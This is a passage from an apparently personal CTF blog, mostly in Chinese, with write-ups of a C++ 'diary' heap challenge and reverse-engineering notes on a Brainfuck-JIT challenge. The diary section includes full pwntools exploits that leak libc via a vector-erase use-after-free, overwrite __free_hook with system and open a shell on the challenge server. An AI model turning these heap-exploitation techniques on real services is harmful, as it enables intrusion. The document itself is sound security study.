class="hljs-built_in">format</span>(sec,buf)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,buf</span>):</span><br>payload = <span class="hljs-string">&quot;update#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,buf)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;show#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;delete#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>payload = <span class="hljs-string">&quot;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,offset,length)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">idx</span>):</span><br>payload = <span class="hljs-string">&quot;decrypt#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">addr</span>):</span><br>gdb.attach(s,<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(&#123;&#125;)</span><br><span class="hljs-string">set $datevec=*(size_t *)$rebase(0x162F0)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>add(i,<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>free(<span class="hljs-number">10</span>-i)<br>    <br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">3</span>)<br>s.recvuntil(<span class="hljs-string">&quot;2022.10.12 0:0:4\n&quot;</span>)<br>heap = u64(s.recvline(keepends=<span class="hljs-literal">False</span>)+<span class="hljs-string">&quot;\x00\x00&quot;</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>libc.address = u64(s.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x1ecbe0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>success(<span class="hljs-built_in">hex</span>(heap))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]-<span class="hljs-number">4</span>))<br>enc(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x2c0</span>-<span class="hljs-number">0x16</span>))<br>add(<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>add(<span class="hljs-number">41</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])[:<span class="hljs-number">6</span>])<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment"># debug(0x4299)</span><br>free(<span class="hljs-number">3</span>)<br><br>s.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a><a href="https://www.ctfiot.com/85535.html">wp2</a></h3><p>delete函数存在uaf，可以利用这个特点来泄露libc和改fd，堆风水比较复杂，造出tcache和unsorted bin重合后，利用encrypt函数里的calloc机制可以改fd，打mallochook即可</p><p>更难看懂……..看起来有onegadget, 算了不研究了, 官方wp看了就得了, 这一题看了老久了看不下去了. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">略. <br></code></pre></div></td></tr></table></figure><h3 id="wp-intended"><a href="#wp-intended" class="headerlink" title="wp intended"></a>wp intended</h3><p>The logic of the erase function of vector is as follows:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(iterator position)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>        <span class="hljs-built_in">copy</span>(position + <span class="hljs-number">1</span>, finish, position); <span class="hljs-comment">//copy range [position+1,end) into position, so 非常昂贵.</span><br>    --finish;<br>    <span class="hljs-built_in">destroy</span>(finish);<br>    <span class="hljs-keyword">return</span> position;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>If the <code>=</code> operation is not rewritten for the class, the function will call the default operation, that is, directly copy all the contents of the class. if there is a pointer, it will also be copied directly.</p><p>So at the time of <code>destroy(finish);</code>, if the pointer in the class is freed in the destructor, then the copied pointer points to a memory that has been freed.</p><p>Here is an example:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">A</span>()&#123;<br>        a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">0x100</span>];<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call A()&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    ~<span class="hljs-built_in">A</span>() &#123;<br>        <span class="hljs-keyword">delete</span> [] a;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call ~A();&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">char</span>* a;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">vector&lt;A&gt; <span class="hljs-title">vec_A</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;<br>    vec_A.<span class="hljs-built_in">erase</span>(vec_A.<span class="hljs-built_in">begin</span>());<br>    <span class="hljs-comment">//after this line, the result is the destructor is called twice. </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The vulnerability of the challenge is in the delete command. If it is not the last idx deleted, then there will be a pointer pointing the freed chunk, which can be used to leak data with the <code>show</code> command. But it needs to leak the random number before rewritten tcache bins’ fd. Then use the xor in the encryption function to xor the fd of the released chunk into the desired address.</p><p>The random numbers are initialized at the beginning, and they will be used in a subsequent cycle. The length is 0x200, so as long as the content of a normal content is encrypted, the random number can be obtained. It should be noted here that the <code>show</code> command will be truncated by ‘\x00’, so multiple encryptions and shows may be necessary to get complete random numbers.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">year,month,day,hour,minutes,sec,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;add#&#x27;</span><br>    cmd += <span class="hljs-built_in">str</span>(year) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(month) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(day) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(hour) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(minutes) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(sec) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;show#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;delete#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;update#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;decrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;encrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(length)<br>    p.sendline(cmd)<br><br><span class="hljs-comment"># p = process(&quot;./diary&quot;)</span><br>ip = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>p = remote(ip,<span class="hljs-number">10111</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<span class="hljs-comment"># idx locate 0-10</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">20</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment"># free 4-10, filled up tcache chunk of size 0x200</span><br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># left 1 2 3, thus 3 is freed unexpectedly</span><br>show(<span class="hljs-number">2</span>) <span class="hljs-comment"># freed 3 is moved to 2.</span><br><br>p.recvuntil(<span class="hljs-string">&quot;1971.12.12 23:22:23\n&quot;</span>)<br><br>leak_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#recieve unsorted fd, where points to libc</span><br><br>info(<span class="hljs-string">&quot;leak_value: &quot;</span> + <span class="hljs-built_in">hex</span>(leak_value))<br><br>__free_hook_ = leak_value + <span class="hljs-number">0x2268</span> - <span class="hljs-number">0xd</span> <span class="hljs-comment">#constant offset</span><br>system = leak_value - <span class="hljs-number">0x19a950</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment">#get 5 chunks from tcache</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">6</span>)<br>p.recvuntil(<span class="hljs-string">&quot;23:22:44\n&quot;</span>)<br>heap_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment"># just tcache pointing to heap area</span><br>info(<span class="hljs-string">&quot;heap_value: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_value))<br><br><span class="hljs-comment">#now, 2 3(free in unsorted) 1&#x27; 2&#x27; 3&#x27; 4&#x27; 5&#x27;(free in tcache)</span><br><span class="hljs-comment">#     0 1                   2  3  4  5  6</span><br><span class="hljs-comment"># now tcache: 5&#x27; 9 10  unsorted: 3</span><br>need_random_value = heap_value ^ __free_hook_ <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    update(<span class="hljs-number">0</span>,<span class="hljs-built_in">chr</span>(need_random_value&amp;<span class="hljs-number">0xff</span>)*<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">####add ? byte into enc vector</span><br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x200</span>)<span class="hljs-comment"># will calloc 0x200 bytes space</span><br>    show(<span class="hljs-number">0</span>)<br>    data = p.recvuntil(<span class="hljs-string">&quot;input&quot;</span>)<br>    data = data[:-<span class="hljs-number">6</span>]<br>    data = data[<span class="hljs-number">25</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0x200</span>:<br>        exit()<br>    <span class="hljs-comment">#到这里说明随机字节串中出现了和想要xor的字节相同的数值. 利用这个字节(相同数字xor后为0无法printf)去xor一个字节如line83. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#not fit exist tcache size, get from top chunk</span><br>    encrypt(<span class="hljs-number">6</span>,i,<span class="hljs-number">1</span>) <span class="hljs-comment">#get 0x20 bytes from top. WHY??</span><br>    <span class="hljs-comment">#我觉得这一大堆加密不是为了heap布局, 而是为了对一块区域使用xor. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x1FF</span>-<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#also not fit in. WHY??</span><br>    need_random_value = need_random_value &gt;&gt; <span class="hljs-number">8</span><br><br><br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pause()<br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">41</span>,<span class="hljs-string">&#x27;;/bin/sh;&#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p64(system)]))<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>折腾了一会儿的调试环境, 发现使用docker调试要装git pwntools python gdb peda, 受不了. </p><ul><li>姑且试了了在container里面调试, 改写compose.yaml以及换源, </li></ul><p>转到ubuntu2004虚拟机上继续. 主要就是想知道heap环境是否和我想的一样. 果然不一样, 忘记了0x300和0x200的区别. </p><ul><li>注意到substr中构造了新的string, 使用了<code>operator *</code>也就是malloc函数, 这是和普通的c程序(而且禁用了IO缓冲区的那种)不一样的地方, 多了很多意料之外的heap操作, 要谨慎选择布局中使用的chunk大小. </li><li>其中54行的减去0xd是指add后最开始四个空格加上<code>;/bin/sh;</code>的长度, 好让line93的system地址能够放在<code>__free_hook</code>上</li><li>free_hook最终被main函数<strong>最后</strong>的string析构函数调用, 而析构的正是我们输入的命令字符串, 所以exp执行完会出现<br><code>sh : 1 : add#a#b#... not a command</code>这样的提示, 之后就可以快乐<code>cat /flag</code>了. </li></ul><p>主要卡在了xor实际上是一种任意写, 只要和循环使用的随机数字配合好(指循环查找相同数值)即可. 然后<code>__free_hook</code>可以被析构函数调用. </p><h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><blockquote><p>仍然是C++逆向</p></blockquote><ul><li>7.5版本老是自动识别不了switch跳转表. 换成新版反编译又有点慢. 挺难受的.</li><li>出现了deque双端队列的使用. 写在Diary中. </li><li>一个地址编码计算看了好一会儿…不太敢意会, 还是准确一点. </li><li>居然是2.35的libc, 而且瞄到了tcache利用, 不是有那个啥保护么. 难搞哦. </li><li>看init函数的时候查着查着又看到ABI, 因为<a href="https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa-atexit.html"><code>__cxa_atexit</code></a>对应着<a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#dso-dtor-runtime-api">标准的这里</a>:<br><code>int __cxa_atexit(void (*func) (void *), void * arg, void * dso_handle);</code><br>那么有个<code>atexit()</code>又是个啥? <code>atexit()</code> does not deal at all with the ability in most implementations to remove [Dynamic Shared Objects] from a running program image by calling <code>dlclose</code> prior to program termination.</li><li>差点忘了create function. </li><li>终于知道IDA里rodata段的函数为什么会是<code>call    near ptr sub_5555555591E0+1</code>这种操作了, 因为被当做字符串了, 几个函数之间有空字符充当结束符和对齐字节. </li><li>2.34+的libc无法使用pwndbg的heap等指令, 因为一个宏定义被修改了. <a href="https://github.com/pwndbg/pwndbg/pull/953/files">issue</a>在这里</li><li><code>probeleak</code> <code>xinfo</code>神奇pwndbg命令. </li></ul><h3 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结:"></a>经验总结:</h3><ul><li>被deque卡住. 看了STL之后熟悉了很多. 下次遇到set mutiset hashmap又得卡. 算了到时候再说. </li><li>以后可以先看看<code>.init_array</code>段中出现的构造函数, 看看有没有用的全局变量提示. 就如这里的<code>unkn_string_arr</code>. </li><li><strong>动静态相结合</strong>可以更快的看出代码的意图. 就比如最重要执行的代码区域的样子, 前面229字节然后一堆call指令, 直接观察call什么地址. </li></ul><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程:"></a>流程:</h3><p>init:</p><ul><li> 第一个buf_16存放一个0x10堆块指针(可以改变). 最终在main的最后把buf_16的地址也就是0x55555555C460作为参数. 难怪有什么a1[5]这种引用. </li></ul>  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.bss:<span class="hljs-number">0x00055555555C460</span> [<span class="hljs-number">0</span>] buf_16          dq ?                    ; DATA XREF: init+<span class="hljs-number">97</span>↑w<br>.bss:<span class="hljs-number">0x00055555555C460</span>                                         ; main+<span class="hljs-number">15</span>C↑o<br>.bss:<span class="hljs-number">0x00055555555C468</span> [<span class="hljs-number">1</span>] init_16         dq ?                    ; DATA XREF: init+<span class="hljs-number">9</span>E↑w<span class="hljs-comment">//初始化为16, 下同. </span><br>.bss:<span class="hljs-number">0x00055555555C470</span> [<span class="hljs-number">2</span>] init_0          dq ?                    ; DATA XREF: init+A9↑w<br>.bss:<span class="hljs-number">0x00055555555C478</span> [<span class="hljs-number">3</span>] mapped_addr_2   dq ?                    ; DATA XREF: init+C6↑w<br>.bss:<span class="hljs-number">0x00055555555C480</span> [<span class="hljs-number">4</span>] malloc_addr     dq ?                    ; DATA XREF: init+D4↑w<br>.bss:<span class="hljs-number">0x00055555555C488</span> [<span class="hljs-number">5</span>] free_addr       dq ?                    ; DATA XREF: init+E2↑w<br>.bss:<span class="hljs-number">0x00055555555C490</span> [<span class="hljs-number">6</span>] memcpy_addr     dq ?                    ; DATA XREF: init+F0↑w<br>.bss:<span class="hljs-number">0x00055555555C498</span> [<span class="hljs-number">7</span>] init_2          dq ?                    ; DATA XREF: init+B4↑w<br></code></pre></div></td></tr></table></figure><ul><li>使用了<code>unkn_string_arr</code>, 把一堆指令复制到了mapped_addr的前面一部分, 也就是说<code>map_str_len</code>从一开始就是229. 而流程中的call指令都是往回跳. </li></ul><p>main中switch: </p><ul><li><p>空白符结束. </p></li><li><p>输入字符串编码成指令, 前几个都是call指令, 跳到<code>cur_len+数字+4</code>的位置. 到方括号就有条件跳转.</p><ul><li><code>+</code> call 0x24C <code>++buf_16[init_0];</code> </li><li><code>, </code> 268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li><li><code>-</code> 259 <code>--buf_16[init_0];</code> </li><li><code>.</code> 288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code>  </li><li><code>&lt;</code> E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li><li><code>&gt; </code> E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li><li><code>?</code> 2B5 见下面代码 使用<code>init_2</code> </li></ul></li><li><p>左方括号</p><ul><li>call 2A7 <code>buf_16[init_0] == 0</code> </li><li>je ??? 6bytes</li><li>push back start_pos</li></ul></li><li><p>右方括号</p><ul><li>jmp start_pos 5bytes</li><li>把左方括号的je跳转到下一条指令.</li></ul></li></ul><img src="../../image/recent_ctf/image-20230129185730706.png" alt="image-20230129185730706" style="zoom: 50%;" /><ul><li>结尾加上retn, 然后使用在init中初始化的buf_16(0x10字节没有初r值)作为参数执行输入字符串所代表的指令, 注意229字节之前都是那一堆rodata的指令. </li></ul><h3 id="几个预置函数"><a href="#几个预置函数" class="headerlink" title="几个预置函数:"></a>几个预置函数:</h3><ul><li>0x5555555591E0 <del>什么玩意儿这是</del>. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_5555555591E0</span><span class="hljs-params">(__int64 *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">if</span> ( init_16 &lt;= init_0 + <span class="hljs-number">1</span> )<br>  &#123;<br>    new_buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * init_16);<br>    <span class="hljs-built_in">memcpy</span>(new_buf, buf_16, init_16);<br>    <span class="hljs-built_in">free</span>(buf_16);<br>    buf_16 = new_buf;<br>    init_16 *= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ???;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li> E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li><li> E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li><li>24C <code>++*(char*)(buf_16 + init_0);</code> </li><li>259 <code>--*(char*)(buf_16 + init_0);</code> </li><li>268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li><li>288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code> </li><li>2A7 ??????? 后接一个je指令, 所以这是判断<code>*(buf_16+init_0) == 0</code> </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.rodata:<span class="hljs-number">00005555555592</span>A7 <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">07</span>                                   mov     rax, [rdi]<br>.rodata:<span class="hljs-number">00005555555592</span>AA <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">5F</span> <span class="hljs-number">10</span>                                mov     rbx, [rdi+<span class="hljs-number">10</span>h]<br>.rodata:<span class="hljs-number">00005555555592</span>AE <span class="hljs-number">8</span>A <span class="hljs-number">0</span>C <span class="hljs-number">18</span>                                   mov     cl, [rax+rbx]<br>.rodata:<span class="hljs-number">00005555555592B</span>1 <span class="hljs-number">20</span> C9                                      <span class="hljs-keyword">and</span>     cl, cl<br>.rodata:<span class="hljs-number">00005555555592B</span>3 C3                                         retn<br></code></pre></div></td></tr></table></figure><ul><li>2B5</li></ul><figure class="highlight 